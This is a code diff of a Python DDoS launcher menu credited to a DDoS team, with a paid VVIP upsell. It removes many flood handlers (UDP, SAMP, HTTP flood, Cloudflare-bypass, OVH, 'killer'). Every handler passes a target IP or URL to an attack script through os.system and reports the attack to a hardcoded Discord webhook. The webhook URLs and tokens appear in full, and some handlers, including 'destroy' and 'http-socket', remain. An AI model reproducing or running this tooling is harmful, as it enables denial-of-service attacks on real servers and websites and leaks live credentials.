@@ -66,14 +66,14 @@ def layer7():
                                 ═════════╦════════════════╦══════════
                         ╔════════════════╩════════════════╩═════════════════╗
              ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
-             ║  ► http-raw         ║ L ║  ► http-rand        ║ L ║  ► mix              ║
-             ║  ► http-socket      ║   ║  ► cf-bypass        ║   ║  ► cf-pro           ║
-             ║  ► ovh              ║   ║  ► cf-socket        ║   ║  ► httpflood        ║
+             ║  ► http-raw         ║ L ║  ►                  ║ L ║  ►                  ║
+             ║  ►                  ║   ║  ►                  ║   ║  ►                  ║
+             ║  ►                  ║   ║  ►                  ║   ║  ►                  ║
              ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
              ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
-             ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║
-             ║  ► hyper            ║   ║  ► killer           ║   ║  ► tlsvip           ║
-             ║  ► slow             ║   ║  ► flood            ║   ║  ► stress           ║
+             ║  ►                  ║ L ║  ►                  ║ L ║  ►                  ║
+             ║  ►                  ║   ║  ►                  ║   ║  ►                  ║
+             ║  ►                  ║   ║  ►                  ║   ║  ►                  ║
              ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
 ''')
 
@@ -90,10 +90,10 @@ def layer4():
                                 ═════════╦════════════════╦══════════
                         ╔════════════════╩════════════════╩═════════════════╗
              ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
-             ║  ► udp              ║   ║  ► stress           ║   ║  ► samplite         ║
-             ║  ► samp             ║ L ║  ► home             ║ L ║  ► samppro          ║
-             ║  ► udpbypass        ║   ║  ► god              ║   ║  ► sampvip          ║
-             ║  ► destroy          ║   ║  ► soon             ║   ║  ► soon             ║
+             ║  ►                  ║   ║  ►                  ║   ║  ►                  ║
+             ║  ►                  ║ L ║  ►                  ║ L ║  ►                  ║
+             ║  ►                  ║   ║  ► god              ║   ║  ►                  ║
+             ║  ► destroy          ║   ║  ►                  ║   ║  ►                  ║
              ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
 ''') 
 
@@ -109,15 +109,15 @@ def menu():
      print(""" 
                         ,     ,                        
                         |\---/|                   Support By : <177 Members & Dandier & Zelly Noy>
-                       /  , , |                   Vip : <True>     
+                       /  , , |                   Vip : <False>     
                   __.-'|  / \ /                   User : <Root>     
          __ ___.-'        ._O|                        
       .-'  '        :      _/                     ╒══════════════════════════════════════════════════════╕   
      / ,    .        .     |                        This tools is not for sell. Private tools and method.
     :  ;    :        :   _/                         Credit : ZxCDDoSS
     |  |   .'     __:   /                           Team   : FzDDoSS
-    |  :   /'----'| \  |                          ╘══════════════════════════════════════════════════════╛
-    \  |\  |      | /| |                        
+    |  :   /'----'| \  |                            Note   : Wanted To Buy VVIP ? Pm @fengzzt
+    \  |\  |      | /| |                          ╘══════════════════════════════════════════════════════╛
      '.'| /       || \ |                        
      | /|.'       '.l \\_                        
      || ||             '-'                        
@@ -162,151 +162,9 @@ def main():
             except IndexError:
                 print('Usage: destroy <ip> <port> <time>')
                 print('Example: destroy 1.1.1.1 80 60')
-                
-        elif "samppro" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                time = cnc.split()[3]
-                thread = cnc.split()[4]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-PRO\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 samp-pro.py {ip} {port} {time} {thread}')
-            except IndexError:
-                print('Usage: samppro <ip> <port> <time> <thread>')
-                print('Example: samppro 1.1.1.1 80 60 1000')                
-
-        elif "sampvip" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                time = cnc.split()[3]
-                thread = cnc.split()[4]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-VIP\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 samp-vip.py {ip} {port} {time} {thread}')
-            except IndexError:
-                print('Usage: sampvip <ip> <port> <time> <thread>')
-                print('Example: sampvip 1.1.1.1 80 60 1000')                
-                
-        elif "home" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                psize = cnc.split()[3]
-                time = cnc.split()[4]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nHOME\n---------------\nTarget: {ip}:{port}\nPsize: {psize}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'perl home.pl {ip} {port} {psize} {time}')
-            except IndexError:
-                print('Usage: home <ip> <port> <packet_size> <time>')
-                print('Example: home 1.1.1.1 80 65500 60')
-
-        elif "udp" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nUDP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python2 udp.py {ip} {port} 0 0')
-            except IndexError:
-                print('Usage: udp <ip> <port>')
-                print('Example: udp 1.1.1.1 80')
-                
-        elif "samplite" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-LITE\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 samp-lite.py {ip} {port}')
-            except IndexError:
-                print('Usage: samplite <ip> <port>')
-                print('Example: samplite 1.1.1.1 80')
-# SPECIAL METHODS
-
-        elif "stress" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                mode = cnc.split()[3]
-                conn = cnc.split()[4]
-                time = cnc.split()[5]
-                out = cnc.split()[6]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSTRESS\n---------------\nTarget: {ip}:{port}\nConns: {conn}\nTime: {time}\nMode: {mode}\nOut: {out}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
-            except IndexError:
-                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
-                print('MODE: [1] TCP')
-                print('      [2] UDP')
-                print('      [3] HTTP')
-                print('Example: stress 1.1.1.1 80 3 1250 60 5')
-                
-        elif "samp" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python2 samp.py {ip} {port}')
-            except IndexError:
-                print('Usage: samp <ip> <port>')
-                print('Example: samp 1.1.1.1 7777')
 
 # LAYER 7 METHODS
-     
-        elif "https-spoof" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                thread = cnc.split()[3]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 https-spoof.py {url} {time} {thread}')
-            except IndexError:
-                print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')
-    
-        elif "slow" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSLOW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node slow.js {url} {time}')
-            except IndexError:
-                print('Usage: slow <url> <time>')
-                print('Example: slow http://vailon.com 60')
-    
-        elif "hyper" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nHYPER\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node hyper.js {url} {time}')
-            except IndexError:
-                print('Usage: hyper <url> <time>')
-                print('Example: hyper http://vailon.com 60')
-                
-        elif "cf-socket" in cnc:
-            try:
-                os.system(f'python3 bypass.py')
-            except IndexError:
-                print('cf-socket')
-    
-        elif "cf-pro" in cnc:
-            try:
-                os.system(f'python3 cf-pro.py')
-            except IndexError:
-                print('cf-pro')
-        elif "cf-socket" in cnc:
-            try:
-                os.system(f'python3 bypass.py')
-            except IndexError:
-                print('cf-socket')
-        
+
         elif "http-socket" in cnc:
             try:
                 url = cnc.split()[1]
@@ -319,28 +177,6 @@ def main():
                 print('Usage: http-socket <url> <per> <time>')
                 print('Example: http-socket http://example.com 5000 60')
 
-        elif "http-raw" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node HTTP-RAW {url} {time}')
-            except IndexError:
-                print('Usage: http-raw <url> <time>')
-                print('Example: http-raw http://example.com 60')
-
-        elif "tls" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nTLS\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node tls.js {url} {thread}')
-            except IndexError:
-                print('Usage: tls <url> <thread>')
-                print('Example: tls http://example.org 120')
-
         elif "http-rand" in cnc:
             try:
                 url = cnc.split()[1]
@@ -352,99 +188,6 @@ def main():
                 print('Usage: http-rand <url> <time>')
                 print('Example: http-rand http://vailon.com/ 60')
 
-        elif "cf-bypass" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                thread = cnc.split()[3]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nCF BYPASS\n---------------\nTarget: {url}Time: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node cf.js {url} {time} {thread}')
-            except IndexError:
-                print('Usage: cf-bypass <url> <time> <threads>')
-                print('Example: cf-bypass http://example.com 60 1250')
-
-        elif "uambypass" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                per = cnc.split()[3]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nUAM BYPASS\n---------------\nTarget: {url}\nTime: {time}\nPer: {per}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node uambypass.js {url} {time} {per} http.txt')
-            except IndexError:
-                print('Usage: uambypass <url> <time> <req_per_ip>')
-                print('Example: uambypass http://example.com 60 1250')
-
-        elif "crash" in cnc:
-            try:
-                url = cnc.split()[1]
-                method = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nCRASH\n---------------\nTarget: {url}\nMethod: {method}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'go run Hulk.go -site {url} -data {method}')
-            except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
-                print('Example: crash http://example.com GET')
-
-        elif "httpflood" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                method = cnc.split()[3]
-                time = cnc.split()[4]
-                device_name = platform.system()
-                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
-                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP FLOOD\n---------------\nTarget: {url}\nThread: {thread}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-            except IndexError:
-                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
-                
-        elif "dandier" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'java dandier.java {url} {thread}')
-            except IndexError:
-                print('Usage: dandier <url> <threads>')
-                print('Example: dandier http://example.com 15000')
-
-        elif "ovh" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                time = cnc.split()[3]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 start.py OVH {url} 4 {thread} http.txt 61 {time}')
-            except IndexError:
-                print('Usage: ovh <url> <thread> <time>')
-                print('Example: ovh https://xnxx.com 800 60')
-                
-        elif "killer" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                time = cnc.split()[3]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nKILLER\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 start.py KILLER {url} 4 {thread} http.txt 61 {time}')
-            except IndexError:
-                print('Usage: killer <url> <thread> <time>')
-                print('Example: killer https://xnxx.com 800 60')
-                
-        elif "mix" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nMIX\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node mix.js {url} {time}')
-            except IndexError:
-                print('Usage: mix <url> <time>')
-                print('Example: mix https://xnxx.com 60')
                 
 # TOOLS
         elif "geoip" in cnc:
@@ -537,7 +280,7 @@ TOOLS   ► MENAMPILKAN TOOLS
             except IndexError:
                 pass
                 
-webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"
+webhook_url = "https://discord.com/api/webhooks/1123200627351240776/HSNj_RHdhmjyBj6F2Zz3Pdb4XX6osq90liUFDXyHL7-gyRptyBwSKGvxQm1bF7Hx49Lm"
 
 def login(): 
      clear() 
